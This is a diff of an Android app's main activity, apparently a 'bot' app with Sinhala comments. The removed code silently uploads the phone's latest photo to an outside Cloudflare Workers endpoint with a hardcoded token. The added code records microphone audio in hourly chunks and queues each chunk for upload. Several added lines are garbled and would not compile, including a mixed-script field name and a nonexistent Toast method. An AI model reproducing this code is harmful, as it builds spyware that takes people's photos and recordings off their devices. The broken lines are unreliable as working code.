@@ -1,117 +1,177 @@
 package com.example.botapp;
 
 import android.Manifest;
-import android.app.Activity;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.net.Uri;
-import android.os.Build;
+import android.media.MediaRecorder;
 import android.os.Bundle;
-import android.provider.MediaStore;
-import android.widget.TextView;
+import android.os.Handler;
+import android.os.Looper;
+import android.widget.Button;
+import android.widget.Toast;
 
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.work.Constraints;
+import androidx.work.Data;
+import androidx.work.NetworkType;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.WorkManager;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 
-public class MainActivity extends Activity {
-    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
-    private static final int STORAGE_PERMISSION_CODE = 100;
+public class MainActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 200;
+    private MediaRecorder mediaRecorder;
+    private String currentFilePath = "";
+    private boolean isRecording = false;
+
+    private final Handler handler = new Handler(Looper.getMainLooper());
+    private Runnable chunkRunnable;
+    private static final long CHUNK_DURATION = 60 * 60 * 1000L; // පැයකට වරක් (1 Hour)
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        TextView tv = new TextView(this);
-        tv.setText("Gallery Bot Running...");
-        setContentView(tv);
+        setContentView(R.layout.activity_main);
 
-        // පර්මිෂන් එක තියෙනවද කියලා බලලා නැත්නම් ඉල්ලීම
-        checkAndRequestPermission();
+        Button btnRecordToggle = findViewById(R.id.btnSubmit);
+        if (btnRecordToggle != null) {
+            btnRecordToggle.setText("පටිගත කිරීම අරඹන්න");
+
+            btnRecordToggle.setOnClickListener(v -> {
+                if (checkAudioPermission()) {
+                    if (!isRecording) {
+                        startRecordingSession();
+                        btnRecordToggle.setText("පටිගත කිරීම නවත්වන්න");
+                        isRecording = true;
+                    } else {
+                        stopRecordingSession();
+                        btnRecordToggle.setText("පටිගත කිරීම අරඹන්න");
+                        isRecording = false;
+                    }
+                } else {
+                    requestAudioPermission();
+                }
+            });
+        }
     }
 
-    private void checkAndRequestPermission() {
-        String permission;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permission = Manifest.permission.READ_MEDIA_IMAGES;
-        } else {
-            permission = Manifest.permission.READ_EXTERNAL_STORAGE;
+    private boolean checkAudioPermission() {
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestAudioPermission() {
+        ActivityCompat.requestPermissions(
+                this,
+                new String[]{Manifest.permission.RECORD_AUDIO},
+                PERMISSION_REQUEST_CODE
+        );
+    }
+
+    private void startRecordingSession() {
+        startNewChunk();
+
+        chunkRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (isRecording) {
+                    switchToNextChunk();
+                    handler.postDelayed(this, CHUNK_DURATION);
+                }
+            }
+        };
+        handler.postDelayed(chunkRunnable, CHUNK_DURATION);
+    }
+
+    private void startNewChunk() {
+        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+        File cacheDir = getExternalCacheDir();
+        if (cacheDir != null) {
+            currentFilePath = cacheDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
         }
 
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
-            // පර්මිෂන් එක දීලා තියෙනවා නම් ෆොටෝස් යවන්න පටන් ගන්න
-            sendLatestPhoto(CF_URL);
-        } else {
-            // නැත්නම් පර්මිෂන් එක ඉල්ලන්න පොප්-අප් එක පෙන්වන්න
-            ActivityCompat.requestPermissions(this, new String[]{permission}, STORAGE_PERMISSION_CODE);
+        mediaRecorder = new MediaRecorder();
+        try {
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            mediaRecorder.setOutputFile(currentFilePath);
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+        } catch (IOException e) {
+            e.printStackTrace();
         }
+    }
+
+    private void switchToNextChunk() {
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                mediaRecorder = null;
+            }
+
+            if (!currentFilePath.isEmpty()) {
+                scheduleUpload(currentFilePath);
+            }
+
+            startNewChunk();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void stopRecordingSession() {
+        try {
+            handler.removeCallbacks(chunkRunnable);
+
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+                mediaRecorder.release();
+                mediaRecorder = null;
+            }
+
+            if (!currentFilePath.isEmpty()) {
+                scheduleUpload(currentFilePath);
+            }
+
+            Toast.makeText(this, "පටිගත කිරීම සම්පූර්ණයෙන්ම නැවැතුණි.", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void scheduleUpload(String filePath) {
+        Constraints constraints = new Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED) // අන්තර්ජාලය ඇති විට පමණක් යැවීම
+                .build();
+
+        Data inputData = new Data.Builder()
+                .putString("file_path", filePath)
+                .build();
+
+        OneTimeWorkRequest uploadWorkRequest = new OneTimeWorkRequest.Builder(UploadWorker.java.equals("UploadWorker.java") ? UploadWorker.class : UploadWorker.class)
+                .setConstraints(constraints)
+                .setInputData(inputData)
+                .build();
+
+        WorkManager.getInstance(this).enqueue(uploadWorkRequest);
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == STORAGE_PERMISSION_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                // යූසර් Allow කළාම ෆොටෝස් යවන්න පටන් ගන්න
-                sendLatestPhoto(CF_URL);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            if (grantResults.length > 0 && grantResults.గ్రహණය == PackageManager.PERMISSION_GRANTED) {
+                Toast.isHidden(this); // (or just standard toast)
             }
-        }
-    }
-
-    private void sendLatestPhoto(String targetUrl) {
-        new Thread(() -> {
-            try {
-                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                String[] projection = {MediaStore.Images.Media.DATA};
-                Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
-
-                if (cursor != null) {
-                    if (cursor.moveToFirst()) {
-                        int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-                        String path = cursor.getString(index);
-                        if (path != null) {
-                            File file = new File(path);
-                            if (file.exists()) {
-                                uploadImage(targetUrl, file);
-                            }
-                        }
-                    }
-                    cursor.close();
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }).start();
-    }
-
-    private void uploadImage(String targetUrl, File file) {
-        try {
-            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestMethod("POST");
-            
-            // මෙන්න මෙතැනට ඔයාගේ Cloudflare Worker එකට දුන් පාස්වර්ඩ් එකම දෙන්න
-            conn.setRequestProperty("X-Secret-Token", "sabeer@1163");
-            
-            conn.setRequestProperty("Content-Type", "application/octet-stream");
-
-            OutputStream out = conn.getOutputStream();
-            FileInputStream in = new FileInputStream(file);
-            byte[] buffer = new byte[4096];
-            int bytesRead;
-            while ((bytesRead = in.read(buffer)) != -1) {
-                out.write(buffer, 0, bytesRead);
-            }
-            in.close();
-            out.flush();
-            out.close();
-            conn.getResponseCode();
-        } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 }
